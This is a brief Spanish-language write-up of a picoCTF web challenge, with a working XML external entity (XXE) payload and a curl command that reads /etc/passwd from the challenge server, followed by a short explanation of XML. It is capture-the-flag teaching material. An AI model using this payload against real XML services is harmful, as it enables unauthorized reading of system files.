# Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:59661/)

# Solución
Se tiene que modificar el request antes de enviarla

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <data><ID>&xxe;</ID></data>
```
```
curl -s -k -X POST http://saturn.picoctf.net:51598/data -H 'Content-Type: application/xml' --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [\x0d\x0a <!ELEMENT foo ANY >\x0d\x0a <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\x0d\x0a]> <data><ID>&xxe;</ID></data>'


# Notas adicionales
**XML** significa **eXtensible Markup Language** (Lenguaje de Marcado Extensible).  
Es un lenguaje que se usa para **almacenar y transportar datos** de forma estructurada.

No es un lenguaje de programación.  
Es un **formato para organizar información**.

-------------------------
```
# Referencias
